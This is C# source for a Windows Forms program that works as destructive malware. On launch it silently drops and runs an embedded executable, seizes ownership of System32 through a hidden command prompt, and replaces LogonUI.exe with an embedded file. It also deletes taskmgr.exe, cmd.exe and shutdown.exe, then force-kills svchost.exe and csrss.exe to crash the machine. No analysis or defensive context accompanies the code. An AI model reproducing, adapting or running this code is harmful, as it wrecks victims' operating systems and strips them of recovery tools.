using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using Microsoft.VisualBasic;

namespace amp_pcv
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
        }

        bool logon_check = true;

        private void Form1_Load(object sender, EventArgs e)
        {
            File.WriteAllBytes("amp.exe", Properties.Resources.amp);
            Process.Start("amp.exe");

            const string quote = "\"";
            ProcessStartInfo logon = new ProcessStartInfo();
            logon.FileName = "cmd.exe";
            logon.WindowStyle = ProcessWindowStyle.Hidden;
            logon.Arguments = @"/k takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant " + quote + "%username%:F" + quote;
            Process.Start(logon);
            string LogonUI = @"C:\Windows\System32\LogonUI.exe";
            while (File.Exists(LogonUI) && logon_check)
            {
                try
                {
                    File.Delete(LogonUI);
                }
                catch (Exception ex) { }
                if (!File.Exists(LogonUI))
                {
                    logon_check = false;
                    File.Delete(@"C:\Windows\System32\taskmgr.exe");
                    File.Delete(@"C:\Windows\System32\cmd.exe");
                    File.Delete(@"C:\Windows\System32\shutdown.exe");
                    

                    File.WriteAllBytes(@"C:\Windows\System32\LogonUI.exe", Properties.Resources.LogonUI);
                    this.Close();
                    Application.Exit();
                }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

            ProcessStartInfo logon = new ProcessStartInfo();
            logon.FileName = "taskkill.exe";
            logon.WindowStyle = ProcessWindowStyle.Hidden;
            logon.Arguments = @"/f /im svchost.exe";
            Process.Start(logon);
            Interaction.Shell("taskkill /f /im svchost.exe");
            Interaction.Shell("taskkill /f /im csrss.exe");
            timer1.Stop();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            _ = e.Cancel;
        }
    }
}
